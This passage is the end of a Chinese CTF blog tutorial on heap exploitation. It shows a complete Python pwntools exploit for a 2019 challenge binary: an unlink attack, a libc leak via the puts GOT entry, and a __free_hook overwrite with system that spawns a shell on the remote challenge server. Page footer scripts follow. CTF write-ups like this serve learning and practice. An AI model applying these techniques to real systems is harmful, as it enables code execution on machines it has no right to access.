class="string">'system'</span>]</span><br><span class="line">bin_sh_addr = libc_base + libc.search(<span class="string">"/bin/sh"</span>).next()</span><br><span class="line">free_hook = libc_base + libc.symbols[<span class="string">'__free_hook'</span>]</span><br><span class="line"><span class="comment">#gdb.attach(io)</span></span><br></pre></td></tr></table></figure><ol start="6"><li>getshell</li></ol><p class="code-caption" data-lang="python" data-line_number="frontend" data-trim_indent="backend" data-label_position="outer" data-labels_left="Code" data-labels_right=":" data-labels_copy="Copy Code"><span class="code-caption-label"></span><a class="code-caption-copy">Copy Code</a></p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">record(<span class="number">3</span>, <span class="string">"/bin/sh"</span>)</span><br><span class="line">record(<span class="number">0</span>, p64(free_hook))</span><br><span class="line">record(<span class="number">2</span>, p64(system_addr))</span><br><span class="line">delete(<span class="number">3</span>)</span><br></pre></td></tr></table></figure><h3 id="exp-2"><a href="#exp-2" class="headerlink" title="exp"></a>exp</h3><p class="code-caption" data-lang="python" data-line_number="frontend" data-trim_indent="backend" data-label_position="outer" data-labels_left="Code" data-labels_right=":" data-labels_copy="Copy Code"><span class="code-caption-label"></span><a class="code-caption-copy">Copy Code</a></p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#!/usr/bin/env python2</span></span><br><span class="line"><span class="comment"># -*- coding: utf-8 -*-</span></span><br><span class="line"><span class="keyword">from</span> PwnContext.core <span class="keyword">import</span> *</span><br><span class="line">local = <span class="literal">False</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># Set up pwntools for the correct architecture</span></span><br><span class="line">exe = <span class="string">'./'</span> + <span class="string">'pwn2'</span></span><br><span class="line">elf = context.binary = ELF(exe)</span><br><span class="line"></span><br><span class="line"><span class="comment">#don't forget to change it</span></span><br><span class="line">host = <span class="string">'39.106.94.18'</span></span><br><span class="line">port = <span class="number">32768</span></span><br><span class="line"></span><br><span class="line"><span class="comment">#don't forget to change it</span></span><br><span class="line"><span class="comment">#ctx.binary = './' + 'pwn2'</span></span><br><span class="line">ctx.binary = exe</span><br><span class="line">libc = args.LIBC <span class="keyword">or</span> <span class="string">'libc.so.6'</span></span><br><span class="line">ctx.debug_remote_libc = <span class="literal">True</span></span><br><span class="line">ctx.remote_libc = libc</span><br><span class="line"><span class="keyword">if</span> local:</span><br><span class="line">    <span class="comment">#context.log_level = 'debug'</span></span><br><span class="line">    io = ctx.start()</span><br><span class="line">    libc = ELF(libc)</span><br><span class="line"><span class="keyword">else</span>:</span><br><span class="line">    io = remote(host,port)</span><br><span class="line">    libc = ELF(libc)</span><br><span class="line"><span class="comment">#===========================================================</span></span><br><span class="line"><span class="comment">#                    EXPLOIT GOES HERE</span></span><br><span class="line"><span class="comment">#===========================================================</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># Arch:     amd64-64-little</span></span><br><span class="line"><span class="comment"># RELRO:    Partial RELRO</span></span><br><span class="line"><span class="comment"># Stack:    Canary found</span></span><br><span class="line"><span class="comment"># NX:       NX enabled</span></span><br><span class="line"><span class="comment"># PIE:      No PIE (0x400000)</span></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">add</span><span class="params">(size)</span>:</span></span><br><span class="line">    io.sendlineafter(<span class="string">"your choice :\n"</span>, <span class="string">"1"</span>)</span><br><span class="line">    io.sendlineafter(<span class="string">"please input the size :\n"</span>, str(size))</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">delete</span><span class="params">(idx)</span>:</span></span><br><span class="line">    io.sendlineafter(<span class="string">"your choice :\n"</span>, <span class="string">"2"</span>)</span><br><span class="line">    io.sendlineafter(<span class="string">"delete which ?\n"</span>,str(idx))</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">show</span><span class="params">(idx)</span>:</span></span><br><span class="line">    io.sendlineafter(<span class="string">"your choice :\n"</span>, <span class="string">"3"</span>)</span><br><span class="line">    io.sendlineafter(<span class="string">"show which ?\n"</span>, str(idx))</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">record</span><span class="params">(idx, content)</span>:</span></span><br><span class="line">    io.sendlineafter(<span class="string">"your choice :\n"</span>, <span class="string">"4"</span>)</span><br><span class="line">    io.sendlineafter(<span class="string">"record which?\n"</span>, str(idx))</span><br><span class="line">    io.sendlineafter(<span class="string">"content?\n"</span>, content)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">exit</span><span class="params">()</span>:</span></span><br><span class="line">    io.sendlineafter(<span class="string">"your choice :\n"</span>, <span class="string">"5"</span>)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">exp</span><span class="params">()</span>:</span></span><br><span class="line">    </span><br><span class="line">    ptr = <span class="number">0x6020c0</span></span><br><span class="line">    add(<span class="number">0x40</span>)</span><br><span class="line">    add(<span class="number">0x80</span>)</span><br><span class="line">    add(<span class="number">0x40</span>)</span><br><span class="line">    add(<span class="number">0x40</span>)</span><br><span class="line">    payload = p64(<span class="number">0</span>) + p64(<span class="number">0x40</span>) + p64(ptr<span class="number">-0x18</span>) + p64(ptr<span class="number">-0x10</span>)</span><br><span class="line">    payload = payload.ljust(<span class="number">0x40</span>)</span><br><span class="line">    payload += p64(<span class="number">0x40</span>)</span><br><span class="line">    payload += p64(<span class="number">0x90</span>)</span><br><span class="line">    record(<span class="number">0</span>, payload)</span><br><span class="line">    record(<span class="number">1</span>, <span class="string">"1"</span>*<span class="number">0x10</span>)</span><br><span class="line">    delete(<span class="number">1</span>)</span><br><span class="line">    <span class="comment">#show(0)</span></span><br><span class="line">    payload = <span class="string">'a'</span>*<span class="number">0x18</span> + p64(<span class="number">0x6020c8</span>+<span class="number">0x8</span>) + p64(<span class="number">0</span>) + p64(elf.got[<span class="string">'puts'</span>])</span><br><span class="line">    record(<span class="number">0</span>, payload)</span><br><span class="line">    show(<span class="number">2</span>)</span><br><span class="line">    io.recvuntil(<span class="string">"the content is :"</span>)</span><br><span class="line">    io.recvline()</span><br><span class="line">    puts_addr = u64(io.recvline().strip().ljust(<span class="number">8</span>, <span class="string">'\x00'</span>))</span><br><span class="line">    io.success(<span class="string">"puts_addr: 0x%x"</span> % puts_addr)</span><br><span class="line">    libc_base = puts_addr - libc.symbols[<span class="string">'puts'</span>]</span><br><span class="line">    system_addr = libc_base + libc.symbols[<span class="string">'system'</span>]</span><br><span class="line">    bin_sh_addr = libc_base + libc.search(<span class="string">"/bin/sh"</span>).next()</span><br><span class="line">    free_hook = libc_base + libc.symbols[<span class="string">'__free_hook'</span>]</span><br><span class="line">    </span><br><span class="line">    record(<span class="number">3</span>, <span class="string">"/bin/sh"</span>)</span><br><span class="line">    record(<span class="number">0</span>, p64(free_hook))</span><br><span class="line">    record(<span class="number">2</span>, p64(system_addr))</span><br><span class="line">    delete(<span class="number">3</span>)</span><br><span class="line">    <span class="comment">#gdb.attach(io)</span></span><br><span class="line">    </span><br><span class="line">    <span class="comment">#delete(0)</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">'__main__'</span>:</span><br><span class="line">    exp()</span><br><span class="line">    io.interactive()</span><br></pre></td></tr></table></figure><h2 id="题目下载地址"><a href="#题目下载地址" class="headerlink" title="题目下载地址"></a>题目下载地址</h2><p><span class="exturl" data-url="aHR0cHM6Ly9naXRodWIuY29tL05vT25lLWh1Yi9jdGYtc2F2ZQ==" title="https://github.com/NoOne-hub/ctf-save">点我，快点我<i class="fa fa-external-link"></i></span></p><h2 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h2><p>实操的时候发觉自己点是知道了，找漏洞点能力还待提升，利用起来也是得多调试下</p><p><strong>本文作者</strong>：NoOne<br><strong>本文地址</strong>： <a href="https://noone-hub.github.io/posts/84788ee9/">https://noone-hub.github.io/posts/84788ee9/</a><br><strong>版权声明</strong>：转载请注明出处！</p></div><div></div><footer class="post-footer"><div class="post-tags"> <a href="/tags/pwn%EF%BC%8C-%E5%A0%86/" rel="tag"># pwn， 堆</a></div><div class="post-nav"><div class="post-nav-next post-nav-item"><a href="/posts/1d71df53/" rel="next" title="pwn堆入门系列教程5"><i class="fa fa-chevron-left"></i> pwn堆入门系列教程5</a></div><span class="post-nav-divider"></span><div class="post-nav-prev post-nav-item"> <a href="/posts/f37fbe7f/" rel="prev" title="pwn堆入门系列教程7">pwn堆入门系列教程7<i class="fa fa-chevron-right"></i></a></div></div></footer></article></div></div><div class="comments" id="comments"></div></div><div class="toggle sidebar-toggle"><span class="toggle-line toggle-line-first"></span><span class="toggle-line toggle-line-middle"></span><span class="toggle-line toggle-line-last"></span></div><aside class="sidebar"><div class="sidebar-inner"><ul class="sidebar-nav motion-element"><li class="sidebar-nav-toc"> Table of Contents</li><li class="sidebar-nav-overview"> Overview</li></ul><div class="post-toc-wrap sidebar-panel"><div class="post-toc motion-element"><ol class="nav"><li class="nav-item nav-level-1"><a class="nav-link" href="#pwn堆入门系列教程6"><span class="nav-number">1.</span> <span class="nav-text">pwn堆入门系列教程6</span></a><ol class="nav-child"><li class="nav-item nav-level-2"><a class="nav-link" href="#2019护网杯-mergeheap"><span class="nav-number">1.1.</span> <span class="nav-text">2019护网杯 mergeheap</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#功能分析"><span class="nav-number">1.1.1.</span> <span class="nav-text">功能分析</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#漏洞点分析"><span class="nav-number">1.1.2.</span> <span class="nav-text">漏洞点分析</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#漏洞利用过程"><span class="nav-number">1.1.3.</span> <span class="nav-text">漏洞利用过程</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#exp"><span class="nav-number">1.1.4.</span> <span class="nav-text">exp</span></a></li></ol></li><li class="nav-item nav-level-2"><a class="nav-link" href="#2019-网络内生安全试验场-pwn1"><span class="nav-number">1.2.</span> <span class="nav-text">2019 网络内生安全试验场 pwn1</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#功能分析-1"><span class="nav-number">1.2.1.</span> <span class="nav-text">功能分析</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#漏洞点分析-1"><span class="nav-number">1.2.2.</span> <span class="nav-text">漏洞点分析</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#漏洞利用过程-1"><span class="nav-number">1.2.3.</span> <span class="nav-text">漏洞利用过程</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#exp-1"><span class="nav-number">1.2.4.</span> <span class="nav-text">exp</span></a></li></ol></li><li class="nav-item nav-level-2"><a class="nav-link" href="#2019-网络内生安全试验场-pwn2"><span class="nav-number">1.3.</span> <span class="nav-text">2019 网络内生安全试验场 pwn2</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#功能分析-2"><span class="nav-number">1.3.1.</span> <span class="nav-text">功能分析</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#漏洞点分析-2"><span class="nav-number">1.3.2.</span> <span class="nav-text">漏洞点分析</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#漏洞利用过程-2"><span class="nav-number">1.3.3.</span> <span class="nav-text">漏洞利用过程</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#exp-2"><span class="nav-number">1.3.4.</span> <span class="nav-text">exp</span></a></li></ol></li><li class="nav-item nav-level-2"><a class="nav-link" href="#题目下载地址"><span class="nav-number">1.4.</span> <span class="nav-text">题目下载地址</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#总结"><span class="nav-number">1.5.</span> <span class="nav-text">总结</span></a></li></ol></li></ol></div></div><div class="site-overview-wrap sidebar-panel"><div class="site-author motion-element" itemprop="author" itemscope itemtype="http://schema.org/Person"> <img class="site-author-image" itemprop="image" alt="NoOne" src="/images/photo.jpg"><p class="site-author-name" itemprop="name">NoOne</p><div class="site-description" itemprop="description">One people that no one know</div></div><div class="site-state-wrap motion-element"><nav class="site-state"><div class="site-state-item site-state-posts"> <a href="/archives/"><span class="site-state-item-count">58</span> <span class="site-state-item-name">posts</span></a></div><div class="site-state-item site-state-categories"> <a href="/categories/"><span class="site-state-item-count">27</span> <span class="site-state-item-name">categories</span></a></div><div class="site-state-item site-state-tags"> <span class="site-state-item-count">27</span> <span class="site-state-item-name">tags</span></div></nav></div><div class="links-of-author motion-element"><span class="links-of-author-item"><span class="exturl" data-url="aHR0cHM6Ly9naXRodWIuY29tL05vT25lLWh1Yg==" title="GitHub &amp;rarr; https:&#x2F;&#x2F;github.com&#x2F;NoOne-hub"><i class="fa fa-fw fa-github"></i> GitHub</span></span><span class="links-of-author-item"><span class="exturl" data-url="Tm9PbmU6ZG90YWVyZGF5QGdtYWlsLmNvbQ==" title="E-Mail &amp;rarr; NoOne:dotaerday@gmail.com"><i class="fa fa-fw fa-envelope"></i> E-Mail</span></span></div></div></div></aside><div id="sidebar-dimmer"></div></div></main><footer class="footer"><div class="footer-inner"><div class="copyright"> &copy; <span itemprop="copyrightYear">2019</span><span class="with-love"><i class="fa fa-user"></i></span> <span class="author" itemprop="copyrightHolder">NoOne</span> <span class="post-meta-divider">|</span><span class="post-meta-item-icon"><i class="fa fa-area-chart"></i></span> <span title="Symbols count total">350k</span> <span class="post-meta-divider">|</span><span class="post-meta-item-icon"><i class="fa fa-coffee"></i></span> <span title="Reading time total">5:18</span></div><script>
  function leancloudSelector(url) {
    return document.getElementById(url).querySelector('.leancloud-visitors-count');
  }
  if (CONFIG.page.isPost) {
    function addCount(Counter) {
      var visitors = document.querySelector('.leancloud_visitors');
      var url = visitors.getAttribute('id').trim();
      var title = visitors.getAttribute('data-flag-title').trim();

      Counter('get', `/classes/Counter?where=${JSON.stringify({ url })}`)
        .then(response => response.json())
        .then(({ results }) => {
          if (results.length > 0) {
            var counter = results[0];
            Counter('put', '/classes/Counter/' + counter.objectId, { time: { '__op': 'Increment', 'amount': 1 } })
              .then(response => response.json())
              .then(() => {
                leancloudSelector(url).innerText = counter.time + 1;
              })
              .catch(error => {
                console.log('Failed to save visitor count', error);
              })
          } else {
              leancloudSelector(url).innerText = 'Counter not initialized! More info at console err msg.';
              console.error('ATTENTION! LeanCloud counter has security bug, see how to solve it here: https://github.com/theme-next/hexo-leancloud-counter-security. \n However, you can still use LeanCloud without security, by setting `security` option to `false`.');
            
          }
        })
        .catch(error => {
          console.log('LeanCloud Counter Error', error);
        });
    }
  } else {
    function showTime(Counter) {
      var visitors = document.querySelectorAll('.leancloud_visitors');
      var entries = [...visitors].map(element => {
        return element.getAttribute('id').trim();
      });

      Counter('get', `/classes/Counter?where=${JSON.stringify({ url: { '$in': entries } })}`)
        .then(response => response.json())
        .then(({ results }) => {
          if (results.length === 0) {
            document.querySelectorAll('.leancloud_visitors .leancloud-visitors-count').forEach(element => {
              element.innerText = 0;
            });
            return;
          }
          for (var i = 0; i < results.length; i++) {
            var item = results[i];
            var url = item.url;
            var time = item.time;
            leancloudSelector(url).innerText = time;
          }
          for (var i = 0; i < entries.length; i++) {
            var url = entries[i];
            var element = leancloudSelector(url);
            if (element.innerText == '') {
              element.innerText = 0;
            }
          }
        })
        .catch(error => {
          console.log('LeanCloud Counter Error', error);
        });
    }
  }

  fetch('https://app-router.leancloud.cn/2/route?appId=KHpRP13gAjuU8mAfkHtBxcDF-gzGzoHsz')
    .then(response => response.json())
    .then(({ api_server }) => {
      var Counter = (method, url, data) => {
        return fetch(`https://${api_server}/1.1${url}`, {
          method: method,
          headers: {
            'X-LC-Id': 'KHpRP13gAjuU8mAfkHtBxcDF-gzGzoHsz',
            'X-LC-Key': 'C1z9X6NQu0ES8qiAOF8RaSq3',
            'Content-Type': 'application/json',
          },
          body: JSON.stringify(data)
        });
      };
      if (CONFIG.page.isPost) {
        const localhost = /http:\/\/(localhost|127.0.0.1|0.0.0.0)/;
        if (localhost.test(document.URL)) return;
        addCount(Counter);
      } else if (document.querySelectorAll('.post-title-link').length >= 1) {
        showTime(Counter);
      }
    });
  </script></div></footer></div><script src="/lib/anime.min.js"></script><script src="/lib/velocity/velocity.min.js"></script><script src="/lib/velocity/velocity.ui.min.js"></script><script src="/js/utils.js"></script><script src="/js/motion.js"></script><script src="/js/schemes/pisces.js"></script><script src="/js/next-boot.js"></script><script>!function(){var t=document.createElement("script"),e=window.location.protocol.split(":")[0];t.src="https"===e?"https://zz.bdstatic.com/linksubmit/push.js":"http://push.zhanzhang.baidu.com/push.js";var s=document.getElementsByTagName("script")[0];s.parentNode.insertBefore(t,s)}()</script><script src="/js/local-search.js"></script><script src="//code.tidio.co/4fgjfhjokt1utyyp9l0cra3v0uw4uuwf.js"></script><script>
NexT.utils.getScript('//unpkg.com/valine/dist/Valine.min.js', () => {
  var GUEST = ['nick', 'mail', 'link'];
  var guest = 'nick,mail,link';
  guest = guest.split(',').filter(item => {
    return GUEST.includes(item);
  });
  new Valine({
    el: '#comments',
    verify: false,
    notify: false,
    appId: 'KHpRP13gAjuU8mAfkHtBxcDF-gzGzoHsz',
    appKey: 'C1z9X6NQu0ES8qiAOF8RaSq3',
    placeholder: "Just go go",
    avatar: 'mm',
    meta: guest,
    pageSize: '10' || 10,
    visitor: false,
    lang: '' || 'zh-cn',
    path: location.pathname,
    recordIP: false,
    serverURLs: ''
  });
}, window.Valine);
</script></body></html>